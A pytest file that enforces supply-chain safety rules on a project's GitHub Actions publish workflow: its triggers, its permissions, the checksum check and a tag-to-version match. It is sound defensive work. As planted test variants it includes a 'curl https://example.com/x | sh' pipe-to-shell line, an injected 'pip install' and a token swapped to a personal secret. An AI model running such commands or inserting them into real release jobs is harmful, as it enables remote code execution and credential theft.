"""The publish workflow (`.github/workflows/publish.yml`): the properties that keep a release safe.

The generic workflow rules (SHA pins, `persist-credentials: false`, the write-scope and `github.token` allowlists, no
`secrets`, no registry overrides) are enforced for every workflow by `test_repo_policy.py`. This file holds what is
specific to publishing: what starts it, which jobs may run where, what the PyPI job is allowed to do, and that the
tag has to name the version that is built. The checks over data are also run against planted violations.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path
from typing import Any, cast

import pytest

import noblecloak
from test_repo_policy import ROOT, Workflow, jobs, load_workflow, steps

PUBLISH = load_workflow("publish.yml")

PUBLIC_REPOSITORY = "NobleCloak/noblecloak-py"
# The pending publisher that became the active one binds this file name, this environment and the public repository.
TRUSTED_PUBLISHER_ENVIRONMENT = "pypi-publish"


def job_permissions(workflow: Workflow, name: str) -> dict[str, str]:
    return jobs(workflow)[name]["permissions"]


def triggers(workflow: Workflow) -> dict[str, Any]:
    # PyYAML reads the bare key `on` as the boolean True.
    return cast(dict[str, Any], cast(dict[Any, Any], workflow)[True])


def uses_of(job: dict[str, Any]) -> list[str]:
    return [s["uses"].split("@")[0] for s in steps(job) if "uses" in s]


def step_named(job: dict[str, Any], name: str) -> dict[str, Any]:
    return next(s for s in steps(job) if s.get("name") == name)


def commands(job: dict[str, Any]) -> list[str]:
    return [s["run"] for s in steps(job) if "run" in s]


# --- identity and triggers ------------------------------------------------------------------------


def test_the_file_is_publish_yml_and_the_pypi_job_uses_the_trusted_publishers_environment() -> None:
    assert (ROOT / ".github/workflows/publish.yml").is_file()
    assert jobs(PUBLISH)["publish"]["environment"] == TRUSTED_PUBLISHER_ENVIRONMENT
    # Only the PyPI job names the environment: it is what asks the reviewers for approval.
    assert [n for n, j in jobs(PUBLISH).items() if "environment" in j] == ["publish"]


def test_it_runs_on_version_tags_and_by_hand_and_nothing_else() -> None:
    assert triggers(PUBLISH) == {"push": {"tags": ["v*"]}, "workflow_dispatch": None}


def test_a_run_for_one_ref_is_never_cancelled_by_another() -> None:
    concurrency = PUBLISH["concurrency"]
    assert concurrency["cancel-in-progress"] is False
    assert "github.ref" in concurrency["group"]


# --- permissions ----------------------------------------------------------------------------------


def test_each_job_holds_exactly_the_scopes_it_needs() -> None:
    assert PUBLISH["permissions"] == {"contents": "read"}
    assert job_permissions(PUBLISH, "build") == {"contents": "read"}
    assert job_permissions(PUBLISH, "release") == {"contents": "write"}
    assert job_permissions(PUBLISH, "publish") == {"contents": "read", "id-token": "write"}


def test_the_publish_job_is_the_only_one_with_an_id_token() -> None:
    holders = [n for n, j in jobs(PUBLISH).items() if "id-token" in j["permissions"]]
    assert holders == ["publish"]


# --- the gates ------------------------------------------------------------------------------------


def gate_clauses(job: dict[str, Any]) -> set[str]:
    return {clause.strip() for clause in str(job["if"]).split("&&")}


def test_the_release_job_runs_for_a_tag_in_the_public_repository_only() -> None:
    release = jobs(PUBLISH)["release"]
    assert release["needs"] == "build"
    assert gate_clauses(release) == {
        "github.ref_type == 'tag'",
        f"github.repository == '{PUBLIC_REPOSITORY}'",
    }


def test_the_pypi_job_runs_only_when_the_release_switch_is_on_for_a_tag_in_the_public_repository() -> None:
    publish = jobs(PUBLISH)["publish"]
    # The irreversible upload waits for the reversible public Release: a failed Release stops it.
    assert publish["needs"] == ["build", "release"]
    assert gate_clauses(publish) == {
        "github.ref_type == 'tag'",
        f"github.repository == '{PUBLIC_REPOSITORY}'",
        "vars.PUBLIC_RELEASE_ENABLED == 'true'",
    }


def test_the_build_job_has_no_gate_so_a_dry_run_from_a_branch_builds_and_stops() -> None:
    assert "if" not in jobs(PUBLISH)["build"]


# --- the jobs that hold a credential install nothing ----------------------------------------------

# The only actions a job that holds `id-token: write` or any `write` scope may use. No checkout, no setup-uv, no
# setup-python: nothing that fetches code or a toolchain runs next to the token. (`pypa/gh-action-pypi-publish`
# carries its own uploader inside the action, and only the PyPI job may use it.)
CREDENTIAL_JOB_ACTIONS = {"actions/download-artifact"}
PYPI_ACTION = "pypa/gh-action-pypi-publish"
# The one shell step a credential-holding job may have, by job: it checks the checksums and creates the release.
CREDENTIAL_JOB_RUN_STEPS: dict[str, str] = {"release": "Create the release"}
# The exact text of that step. Substring checks let `pip install x; gh release create ...` or an appended
# `curl ... | sh` through, so the step is compared whole.
RELEASE_RUN = (
    "(cd dist && sha256sum --check --strict ../sums/SHA256SUMS)\n"
    'gh release create "$TAG" dist/* sums/SHA256SUMS --repo "$GITHUB_REPOSITORY" --title "$TAG" '
    "--verify-tag --generate-notes"
)
RELEASE_ENV = {"GH_TOKEN": "${{ github.token }}", "TAG": "${{ github.ref_name }}"}
RELEASE_STEP_KEYS = {"name", "env", "run"}


def holds_a_credential(job: dict[str, Any]) -> bool:
    permissions = job.get("permissions", {})
    return "id-token" in permissions or "write" in permissions.values()


def install_violations(workflow: Workflow) -> list[str]:
    """For every job that holds an id-token or a write scope: any action or `run` line outside its allowlist."""
    found: list[str] = []
    for name, job in jobs(workflow).items():
        if not holds_a_credential(job):
            continue
        for step in steps(job):
            if "run" in step and (
                name not in CREDENTIAL_JOB_RUN_STEPS or step.get("name") != CREDENTIAL_JOB_RUN_STEPS[name]
            ):
                found.append(f"{name}: run line: {step['run']}")
        allowed: set[str] = set(CREDENTIAL_JOB_ACTIONS)
        if "id-token" in job["permissions"]:
            allowed.add(PYPI_ACTION)
        found.extend(f"{name}: action {use}" for use in uses_of(job) if use not in allowed)
    return found


def test_the_jobs_that_hold_a_credential_install_nothing() -> None:
    assert install_violations(PUBLISH) == []
    credential_jobs = [n for n, j in jobs(PUBLISH).items() if holds_a_credential(j)]
    assert credential_jobs == ["release", "publish"]


def release_step_violations(job: dict[str, Any]) -> list[str]:
    """What differs from the one allowed shape of the release step: its keys, its whole `run` text, its env."""
    step = step_named(job, "Create the release")
    found: list[str] = []
    if set(step) != RELEASE_STEP_KEYS:
        found.append(f"keys: {sorted(step)}")
    if str(step.get("run", "")).strip() != RELEASE_RUN:
        found.append(f"run: {step.get('run')}")
    if step.get("env") != RELEASE_ENV:
        found.append(f"env: {step.get('env')}")
    if commands(job) != [step.get("run")]:
        found.append(f"other run steps: {commands(job)}")
    return found


def test_the_release_job_runs_only_the_checksum_check_and_the_release_command() -> None:
    assert release_step_violations(jobs(PUBLISH)["release"]) == []


def test_the_release_step_check_finds_planted_variants() -> None:
    release = jobs(PUBLISH)["release"]
    index = steps(release).index(step_named(release, "Create the release"))
    step = steps(release)[index]
    variants: dict[str, dict[str, Any]] = {
        "an install before the command": {**step, "run": "pip install x; " + step["run"]},
        "a pipe to a shell appended": {**step, "run": step["run"].rstrip() + "\ncurl https://example.com/x | sh\n"},
        "an extra env var": {**step, "env": {**step["env"], "GH_HOST": "example.com"}},
        "a `with` block": {**step, "with": {"x": "y"}},
        "a changed token": {**step, "env": {**step["env"], "GH_TOKEN": "${{ secrets.PAT }}"}},
    }
    for label, bad_step in variants.items():
        bad_steps = [*steps(release)[:index], bad_step, *steps(release)[index + 1 :]]
        assert release_step_violations({**release, "steps": bad_steps}) != [], label


def pypi_step_violations(job: dict[str, Any]) -> list[str]:
    """The PyPI action takes no inputs: `with` (repository-url, password, attestations, ...) would change the upload."""
    return [
        f"{s['uses']}: {sorted(s)}"
        for s in steps(job)
        if s.get("uses", "").startswith(PYPI_ACTION) and set(s) != {"uses"}
    ]


def test_the_pypi_action_is_given_no_inputs() -> None:
    publish = jobs(PUBLISH)["publish"]
    assert [s["uses"] for s in steps(publish) if s["uses"].startswith(PYPI_ACTION)] != []
    assert pypi_step_violations(publish) == []
    extras: list[dict[str, Any]] = [
        {"with": {"repository-url": "https://example.com/legacy/"}},
        {"with": {}},
        {"env": {"X": "y"}},
    ]
    for extra in extras:
        bad = {**publish, "steps": [{**s, **extra} if s["uses"].startswith(PYPI_ACTION) else s for s in steps(publish)]}
        assert pypi_step_violations(bad) != [], extra


def test_the_install_check_finds_planted_installs() -> None:
    download = {"uses": "actions/download-artifact@" + "a" * 40}
    pypi: Workflow = {
        "jobs": {
            "publish": {
                "permissions": {"contents": "read", "id-token": "write"},
                "steps": [download, {"uses": "pypa/gh-action-pypi-publish@x"}],
            }
        }
    }
    release: Workflow = {
        "jobs": {
            "release": {
                "permissions": {"contents": "write"},
                "steps": [download, {"name": "Create the release", "run": "gh release create"}],
            }
        }
    }
    assert install_violations(pypi) == []
    assert install_violations(release) == []
    planted = [
        {"run": "pip install twine"},
        {"run": "uv sync"},
        {"run": "echo hi"},
        {"name": "Create the release", "run": "echo a second step with the allowed name"},
        {"uses": "astral-sh/setup-uv@" + "a" * 40},
        {"uses": "actions/setup-python@" + "a" * 40},
        {"uses": "actions/checkout@" + "a" * 40},
    ]
    for base in (pypi, release):
        name, job = next(iter(base["jobs"].items()))
        for step in planted:
            if step.get("name") == "Create the release" and name == "release":
                continue  # the same name on the release job is its own step, which is allowed once
            bad: Workflow = {"jobs": {name: {**job, "steps": [*job["steps"], step]}}}
            assert install_violations(bad) != [], (name, step)
    # The release job may not use the PyPI action; only the job holding an id-token may.
    bad_release: Workflow = {
        "jobs": {
            "release": {**release["jobs"]["release"], "steps": [download, {"uses": "pypa/gh-action-pypi-publish@x"}]}
        }
    }
    assert install_violations(bad_release) != []
    # A job that holds no credential is not one of these; it may run what it likes (the build job does).
    other: Workflow = {"jobs": {"b": {"permissions": {"contents": "read"}, "steps": [{"run": "uv build"}]}}}
    assert install_violations(other) == []


# --- what is built and what reaches each job ------------------------------------------------------


def artifact_uploads(job: dict[str, Any]) -> dict[str, str]:
    return {
        s["with"]["name"]: s["with"]["path"]
        for s in steps(job)
        if s.get("uses", "").startswith("actions/upload-artifact@")
    }


def artifact_downloads(job: dict[str, Any]) -> dict[str, str]:
    return {
        s["with"]["name"]: s["with"]["path"]
        for s in steps(job)
        if s.get("uses", "").startswith("actions/download-artifact@")
    }


def test_the_package_is_built_once_and_the_checksums_are_kept_out_of_dist() -> None:
    build = jobs(PUBLISH)["build"]
    assert [c for c in commands(build) if c.strip() == "uv build"] == ["uv build"]
    assert [n for n, j in jobs(PUBLISH).items() if "uv build" in "\n".join(commands(j))] == ["build"]
    # twine rejects a file that is neither a wheel nor an sdist, so SHA256SUMS never goes in the directory it uploads.
    assert artifact_uploads(build) == {"dist": "dist/", "sha256sums": "sums/SHA256SUMS"}
    sums = step_named(build, "Write SHA256SUMS")["run"]
    assert "sha256sum" in sums
    assert "sums/SHA256SUMS" in sums
    assert "dist/SHA256SUMS" not in sums
    assert all(
        s["with"]["if-no-files-found"] == "error" for s in steps(build) if "upload-artifact" in s.get("uses", "")
    )


def test_the_pypi_job_receives_the_distributions_and_not_the_checksums() -> None:
    assert artifact_downloads(jobs(PUBLISH)["publish"]) == {"dist": "dist/"}


def test_the_release_checks_the_checksums_before_it_creates_the_release() -> None:
    release = jobs(PUBLISH)["release"]
    assert artifact_downloads(release) == {"dist": "dist/", "sha256sums": "sums/"}
    run = step_named(release, "Create the release")["run"]
    check = run.index("sha256sum --check")
    create = run.index("gh release create")
    assert check < create
    assert 'dist/* sums/SHA256SUMS --repo "$GITHUB_REPOSITORY"' in run
    assert "--verify-tag" in run


def test_the_release_step_reads_the_tag_from_the_environment_not_from_the_script_text() -> None:
    step = step_named(jobs(PUBLISH)["release"], "Create the release")
    assert step["env"]["TAG"] == "${{ github.ref_name }}"
    assert "${{" not in step["run"]


# --- the tag has to name the version that is built ------------------------------------------------


def run_tag_check(tag: str) -> subprocess.CompletedProcess[str]:
    step = step_named(jobs(PUBLISH)["build"], "Check that the tag names the package version")
    assert step["if"] == "github.ref_type == 'tag'"
    assert step["env"] == {"TAG": "${{ github.ref_name }}"}
    return subprocess.run(
        ["bash", "-e", "-c", step["run"]],
        cwd=ROOT,
        env={**os.environ, "TAG": tag},
        capture_output=True,
        text=True,
        check=False,
    )


def test_a_tag_that_names_the_package_version_passes_the_check() -> None:
    assert run_tag_check(f"v{noblecloak.__version__}").returncode == 0


@pytest.mark.parametrize("tag", ["v0.0.0", "v9.9.9", noblecloak.__version__, f"v{noblecloak.__version__}.1", "v", ""])
def test_any_other_tag_fails_the_check(tag: str) -> None:
    result = run_tag_check(tag)
    assert result.returncode != 0
    assert "does not match" in result.stderr


def test_the_tag_check_fails_when_the_version_cannot_be_read(tmp_path: Path) -> None:
    step = step_named(jobs(PUBLISH)["build"], "Check that the tag names the package version")
    # No src/noblecloak/__init__.py in this directory, so there is no version to compare the tag with.
    result = subprocess.run(
        ["bash", "-e", "-c", step["run"]],
        cwd=tmp_path,
        env={**os.environ, "TAG": f"v{noblecloak.__version__}"},
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode != 0


# --- the runbook -----------------------------------------------------------------------------------


def read_runbook() -> str:
    """RELEASING.md is export-ignored, so the public repository has no runbook; these checks run in the mirror."""
    path = ROOT / "RELEASING.md"
    if not path.is_file():
        pytest.skip("RELEASING.md is a mirror-only file")
    return path.read_text(encoding="utf-8")


def test_the_runbook_names_the_switch_the_environment_and_the_repository_the_workflow_uses() -> None:
    runbook = read_runbook()
    gate = str(jobs(PUBLISH)["publish"]["if"])
    variable = next(word for word in gate.replace(".", " ").split() if word.startswith("PUBLIC_RELEASE"))
    assert f"gh variable set {variable} --body true -R {PUBLIC_REPOSITORY}" in runbook
    assert f"environments/{TRUSTED_PUBLISHER_ENVIRONMENT}" in runbook
    assert "publish.yml" in runbook
    # The tag rule the build job enforces is the one the runbook gives.
    assert 'git tag -a v<version> -m "v<version>"' in runbook
    assert "src/noblecloak/__init__.py" in runbook


def test_the_runbook_environment_payload_closes_the_admin_bypass_and_self_review() -> None:
    runbook = read_runbook()
    assert "prevent_self_review: true" in runbook
    assert "can_admins_bypass: false" in runbook


def test_contributing_describes_the_publish_workflow_it_has() -> None:
    contributing = (ROOT / "CONTRIBUTING.md").read_text(encoding="utf-8")
    assert "There is no publish workflow yet." not in contributing
    assert ".github/workflows/publish.yml" in contributing
